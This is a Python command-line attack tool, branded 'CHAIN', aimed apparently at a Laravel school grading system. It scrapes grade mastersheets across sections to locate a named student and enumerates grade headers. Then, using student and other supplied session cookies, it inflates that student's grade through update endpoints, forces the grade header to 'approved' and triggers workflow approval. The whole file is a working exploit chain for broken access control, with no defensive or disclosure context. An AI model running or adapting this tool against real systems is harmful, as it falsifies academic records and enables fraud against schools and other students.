import asyncio
import aiohttp
import requests
import sys
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def _build_banner():
    art = [
        " ┌──────────┐ ",
        " │ DUMPSTER │ ",
        " │  grade   │ ",
        " │  scout   │ ",
        " └────┬─────┘ ",
        "      │       ",
        " ┌────▼─────┐ ",
        " │   STYX   │ ",
        " │  header  │ ",
        " │   enum   │ ",
        " └────┬─────┘ ",
        "      │       ",
        " ┌────▼─────┐ ",
        " │   NEXUS  │ ",
        " │  exploit │ ",
        " └──────────┘ ",
    ]

    chain = [
        " ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗",
        "██╔════╝██║  ██║██╔══██╗██║████╗  ██║",
        "██║     ███████║███████║██║██╔██╗ ██║",
        "██║     ██╔══██║██╔══██║██║██║╚██╗██║",
        "╚██████╗██║  ██║██║  ██║██║██║ ╚████║",
        " ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝",
    ]

    T = max(len(l) for l in chain)
    colored_title = (
        [" " * T] * 5
        + [f"{CYAN}{l}{RESET}{' ' * (T - len(l))}" for l in chain]
        + [" " * T] * 5
    )

    lines = [""]
    for t, a in zip(colored_title, art):
        lines.append(f"  {t}    {DIM}{a}{RESET}")
    lines.append(f"\n  {DIM}automated attack chain  //  dumpster → styx → nexus{RESET}\n")
    return "\n".join(lines)

print(_build_banner())

# ── helpers ───────────────────────────────────────────────────────────────────

def phase(n, title, color=CYAN):
    label = f" PHASE {n}: {title.upper()} "
    bar   = "═" * (len(label) + 2)
    print(f"\n  {color}╔{bar}╗")
    print(f"  ║ {label} ║")
    print(f"  ╚{bar}╝{RESET}")

def info(msg):
    print(f"  {DIM}│{RESET}  {msg}")

def ok(msg):
    print(f"  {DIM}│{RESET}  {GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"  {DIM}│{RESET}  {RED}[-]{RESET} {msg}")
    sys.exit(1)

def sep():
    print(f"  {DIM}└{'─' * 46}{RESET}")

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    phase(0, "Configuration", DIM)
    BASE_URL  = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Target URL               : ").strip().rstrip("/")
    SY_ID     = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} SY ID        (def 1)    : ").strip() or "1"
    LEVEL_ID  = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Level ID     (def 3)    : ").strip() or "3"
    QUARTER   = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Quarter      (def 1)    : ").strip() or "1"
    info("")
    info(f"{DIM}── scan ranges ──────────────────────────────{RESET}")
    SID_RANGE  = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Section range  (1-200)  : ").strip() or "1-200"
    SUBID_RANGE = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Subject range  (1-30)   : ").strip() or "1-30"
    MAX_CONC   = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Concurrency   (def 50)  : ").strip() or "50")
    info("")
    info(f"{DIM}── target ────────────────────────────────────{RESET}")
    TARGET_NAME  = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Student name (search)   : ").strip().lower()
    TARGET_GRADE = int(input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Grade to set (def 100)  : ").strip() or "100")
    info("")
    info(f"{DIM}── sessions ──────────────────────────────────{RESET}")
    STUDENT_SESSION    = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Student session         : ").strip()
    NONDEFAULT_SESSION = input(f"  {DIM}│{RESET}  {CYAN}[?]{RESET} Non-default session     : ").strip()
    sep()
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

def parse_range(s):
    a, b = (s.split("-"))[:2] if "-" in s else (s, s)
    return list(range(int(a), int(b) + 1))

sections = parse_range(SID_RANGE)
subjects  = parse_range(SUBID_RANGE)

# shared state
found_student = None
found_header  = None

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — DUMPSTER: scan sections, locate target student
# ══════════════════════════════════════════════════════════════════════════════

phase(1, "Dumpster — grade scout", YELLOW)
info(f"Scanning {CYAN}{len(sections)}{RESET} sections for {YELLOW}'{TARGET_NAME}'{RESET}...")
print()

async def _dumpster(session, semaphore, lock, sid):
    global found_student
    async with semaphore:
        if found_student:
            return
        try:
            async with session.get(
                f"{BASE_URL}/grades/report/mastersheet",
                params={"syid": SY_ID, "sectionid": sid,
                        "levelid": LEVEL_ID, "quarter": QUARTER},
            ) as r:
                data = await r.json(content_type=None)
                if not data:
                    return
                for st in data:
                    name = f"{st.get('lastname','')} {st.get('firstname','')}".lower()
                    if TARGET_NAME in name:
                        async with lock:
                            if not found_student:
                                found_student = {**st, "section_id": sid}
                        break
        except Exception:
            pass

async def phase1():
    sem  = asyncio.Semaphore(MAX_CONC)
    lock = asyncio.Lock()
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=MAX_CONC)
    ) as sess:
        with tqdm(
            total=len(sections),
            desc=f"  {DIM}dumpster{RESET}",
            unit="sec",
            colour="yellow",
            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]",
        ) as pbar:
            async def run(sid):
                await _dumpster(sess, sem, lock, sid)
                pbar.update(1)
            await asyncio.gather(
                *[asyncio.create_task(run(s)) for s in sections],
                return_exceptions=True,
            )

try:
    asyncio.run(phase1())
except KeyboardInterrupt:
    print(f"\n  {YELLOW}[!]{RESET} Interrupted.")
    raise SystemExit(0)

print()
if not found_student:
    fail(f"Student '{TARGET_NAME}' not found in any section.")

section_id = found_student["section_id"]
student_id = found_student["id"]
detail_id  = found_student.get("detailid") or found_student.get("gdid")
full_name  = f"{found_student.get('lastname', '')}, {found_student.get('firstname', '')}"

ok(f"{BOLD}{full_name}{RESET}  student_id={CYAN}{student_id}{RESET}  "
   f"section_id={CYAN}{section_id}{RESET}  detail_id={CYAN}{detail_id}{RESET}")
sep()

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — STYX: find valid grade header for the discovered section
# ══════════════════════════════════════════════════════════════════════════════

phase(2, "Styx — header enum", MAGENTA)
info(f"Scanning {CYAN}{len(subjects)}{RESET} subjects  section={CYAN}{section_id}{RESET}  "
     f"level={CYAN}{LEVEL_ID}{RESET}  q={CYAN}{QUARTER}{RESET}...")
print()

async def _styx(session, semaphore, lock, sub):
    global found_header
    async with semaphore:
        if found_header:
            return
        try:
            async with session.get(
                f"{BASE_URL}/get/grade/header",
                params={"syid": SY_ID, "gradelevelid": LEVEL_ID,
                        "subjectid": sub, "quarter": QUARTER,
                        "sectionid": section_id},
            ) as r:
                data = await r.json(content_type=None)
                if data:
                    async with lock:
                        if not found_header:
                            found_header = {**data[0], "subjid": sub}
        except Exception:
            pass

async def phase2():
    sem  = asyncio.Semaphore(MAX_CONC)
    lock = asyncio.Lock()
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=MAX_CONC)
    ) as sess:
        with tqdm(
            total=len(subjects),
            desc=f"  {DIM}styx{RESET}",
            unit="sub",
            colour="magenta",
            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]",
        ) as pbar:
            async def run(sub):
                await _styx(sess, sem, lock, sub)
                pbar.update(1)
            await asyncio.gather(
                *[asyncio.create_task(run(s)) for s in subjects],
                return_exceptions=True,
            )

try:
    asyncio.run(phase2())
except KeyboardInterrupt:
    print(f"\n  {YELLOW}[!]{RESET} Interrupted.")
    raise SystemExit(0)

print()
if not found_header:
    fail(f"No grade header found for section={section_id} level={LEVEL_ID}.")

header_id = found_header["id"]
subj_id   = found_header["subjid"]

ok(f"header_id={CYAN}{header_id}{RESET}  subj_id={CYAN}{subj_id}{RESET}  "
   f"status={found_header.get('status')}")
sep()

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — NEXUS: execute grade manipulation chain
# ══════════════════════════════════════════════════════════════════════════════

phase(3, "Nexus — exploit chain", RED)
info(f"Target  {CYAN}{full_name}{RESET}  →  grade {YELLOW}{TARGET_GRADE}{RESET}")
print()

s = requests.Session()

def req(method, url, **kwargs):
    try:
        return getattr(s, method)(url, timeout=5, **kwargs)
    except Exception as e:
        fail(f"Request failed: {e}")

# Step 1+2: already resolved — skip remote calls
ok(f"Step 1 ✓  header_id={CYAN}{header_id}{RESET}  (from Styx phase)")
ok(f"Step 2 ✓  detail_id={CYAN}{detail_id}{RESET}  (from Dumpster phase)")

# Step 3: inflate grade
info(f"Step 3 — inflating grade → {YELLOW}{TARGET_GRADE}{RESET}  (student session)...")
s.cookies.set("laravel_session", STUDENT_SESSION)
r = req("get", f"{BASE_URL}/gradesdetail/update", params={
    "data[0][id]":     detail_id,
    "data[0][studid]": student_id,
    "data[0][field]":  "grade",
    "data[0][grade]":  TARGET_GRADE,
})
result = r.json()
if result and result[0].get("status") == 1:
    ok(f"Step 3 ✓  grade set to {YELLOW}{TARGET_GRADE}{RESET}")
else:
    fail(f"Grade inflation failed: {r.text}")

# Step 4: force header approved
info("Step 4 — forcing header status = approved...")
r = req("get", f"{BASE_URL}/gradesheader/update", params={
    "data[0][id]":        header_id,
    "data[0][syid]":      SY_ID,
    "data[0][sectionid]": section_id,
    "data[0][subjid]":    subj_id,
    "data[0][field]":     "status",
    "data[0][grade]":     3,
})
result = r.json()
if result and result[0].get("status") == 1:
    ok("Step 4 ✓  header forced to approved")
else:
    fail(f"Header force failed: {r.text}")

# Step 5: trigger workflow
info("Step 5 — triggering workflow approval  (non-default session)...")
s.cookies.set("laravel_session", NONDEFAULT_SESSION)
r = req("get", f"{BASE_URL}/posting/grade/subject/approve", params={
    "gdid": detail_id, "teacherid": 1
})
ok(f"Step 5 ✓  response: {r.text[:60]}")
sep()

# ── summary ───────────────────────────────────────────────────────────────────

w = 46
print(f"""
  {GREEN}╔{'═' * w}╗
  ║{'CHAIN COMPLETE':^{w}}║
  ╚{'═' * w}╝{RESET}

  {DIM}student   {RESET}{CYAN}{full_name}{RESET}
  {DIM}id        {RESET}{CYAN}{student_id}{RESET}
  {DIM}section   {RESET}{CYAN}{section_id}{RESET}
  {DIM}subject   {RESET}{CYAN}{subj_id}{RESET}
  {DIM}grade     {RESET}{GREEN}{TARGET_GRADE}{RESET}  {DIM}· status approved{RESET}
""")
